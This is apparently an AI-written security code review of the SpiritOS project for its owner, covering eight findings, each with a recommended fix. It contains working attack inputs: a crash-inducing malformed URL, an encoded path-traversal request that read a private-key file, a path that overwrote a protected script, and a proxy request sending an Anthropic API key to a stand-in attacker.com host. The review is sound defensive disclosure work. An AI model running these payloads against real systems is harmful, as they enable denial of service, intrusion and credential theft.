Code review: SpiritOS
I read the server, kernel, jobs, relay/hub/auth, the client shell, and the host scripts, and verified the significant findings by running them rather than reasoning from the source. Four are confirmed end-to-end.

1. Unauthenticated remote crash on the public relay
server.js:498 — decodeURIComponent(url.pathname) throws URIError on malformed percent-encoding, uncaught inside the request handler, so the process exits. It runs before the isRelayPublicPath check, so the relay's narrowed surface doesn't protect it.

Verified: GET /%zz killed both a personal node and a --relay process.


URIError: URI malformed
    at Server.<anonymous> (js/server.js:498:20)
The systemd unit has Restart=on-failure / RestartSec=3, so it self-heals — but a request in a loop keeps spirit.andyflinn.com permanently down from one line of curl, with mailbox state re-read on every restart. Wrap the decode in try/catch → 400, and add process.on('uncaughtException') plus server.on('clientError') as backstops.

2. Both filesystem gates are bypassable with non-canonical paths
fileServable and fileWritable (kernel.js:196-224) pattern-match the raw request string, while fsPath resolves it separately. The two disagree:

input	gate says	resolves to
relay-state/identity.json	blocked	—
./relay-state/identity.json	servable	the private key
x/../js/relayAuth.js	servable	the auth module
app/natter/natter.js	not writable	—
app/./natter/natter.js	writable	the protected entry script
Over HTTP the read path survives via encoded slashes — the WHATWG URL parser collapses literal ../, but %2f reaches decodeURIComponent intact:


GET /x%2f..%2frelay-state%2fidentity.json   → 200
{"name":"fake","publicKey":"FAKE_PUB","privateKey":"FAKE_PRIVATE_KEY_SENTINEL_12345"}
And the write path defeats the "protected everywhere, from every tool" invariant:


POST /api/fs/save {"path":"app/./natter/natter.js","content":"PWNED"}  → 204
$ head -c 40 spirit/run/app/natter/natter.js
PWNED
(I restored the file; git status is clean.) Reads stay loopback-only on a personal node, and a --relay never exposes the static route — so this is a local boundary failure, not a public one. The fix is one shape change: resolve with fsPath first, derive the ROOT_DIR-relative forward-slashed path, and run every pattern against that canonical form.

Worth noting why the harness didn't catch it: pathJail.js and servableAssets.js feed only canonical strings — pathJail.js even asserts ./index.html loads, which is the exact bypass one directory over. All 102 assertions pass against a bypassable gate. Adding non-canonical variants of each denied path would have caught every row above.

3. escapeHtml isn't attribute-safe
shell.js:782 builds via textContent → innerHTML, which escapes &, <, > but not quotes — and it's used in ~30 attribute contexts. Two reachable inputs:

Filenames — index.html:474-475 puts entry.name / entry.relativePath into data-name="…". Not authored by the user; " is legal in POSIX filenames.
App name/icon overrides — index.html:1099, 1106 into value="…", persisted to preferences.json, which is a writable root file any app can write.
Scoping this honestly: apps already share the page realm, and shell.js's own comment frames api as shrinking what an app sees rather than as a sandbox — so this is stored XSS, not a sandbox escape. Fix is a hand-rolled replace chain including " and ', or setAttribute/dataset at those sites.

4. /api/proxy will send your Anthropic key anywhere
PROXY_ENV_SUBSTITUTION_ALLOWLIST gates which env var, never which destination — {"url":"https://attacker.com","headers":{"x-api-key":"${ENV:ANTHROPIC_API_KEY}"}} substitutes the real key. The comment's claim ("can't be used to leak an unrelated server env var to an arbitrary URL") holds for unrelated vars, but the allowlisted one goes to any host named. Pair each name with its permitted destination.

5. Relay inbox is unauthenticated
claim and send are signature-gated in keys mode; inbox (relay.js) takes a bare ?name= and returns that peer's messages. server.js's comment says "the mailbox routes themselves are gated by the allow list and signature checks" — true of two of the three. Either sign inbox reads or narrow the claim.

6. Relay rate limiting is per-name and unbounded
rateOk keys on from, so rotating names yields a fresh 30/min budget each time, and claimHits/sendHits entries are never pruned — unbounded growth on a 1 GB box. relayAbuse.test.js only exercises one fixed name, which is why it reads as covered. Add per-IP limiting and evict empty buckets.

7. Two operational notes
Default-open relay: loadAllow treats a missing allow.json as mode:'open' — anyone can claim, send, and read. The README says to create it, but nothing warns at startup. One log line when a --relay boots open would make it visible.
Root + 10-minute auto-deploy: the unit runs node as root (no User=) and cron hard-resets to origin/master every 10 minutes, so anything reaching GitHub master is root on the box within 10 minutes. Deliberate for a single operator, but node on :65430 doesn't need root — User=, NoNewPrivileges=yes, ProtectSystem=strict cost nothing.
8. Minor
jobs.js:151 sets status: 'error', which isn't in TERMINAL_STATUSES — a failed fs-watcher becomes an undeletable zombie, since deleteJob refuses non-terminal jobs forever. Use 'failed'.
jobs.events never gets setMaxListeners; the 11th open tab prints a MaxListenersExceededWarning.
handleSseConnection cleans up on 'close' but not 'error'.
What's genuinely good, since it should be said: the path jail itself is correct and well-tested; the BOOT_ASSETS carve-out is disciplined; saveAppManifest force-setting owner server-side rather than trusting the caller is exactly the right instinct; the ${ENV:...} design keeps the key out of browser-visible code entirely; and the comments explain why rather than what, which is rare. Having a real harness for the security boundaries at all puts this well ahead of most projects its size.

The single unifying theme: the gates are well-reasoned but every one of them matches on an unvalidated input string. Canonicalize once, then check — that closes #2 and its whole class in one change.

Happy to fix any of these; I'd start with #1 and #2. Want me to also put this up as a page you can work through and check off?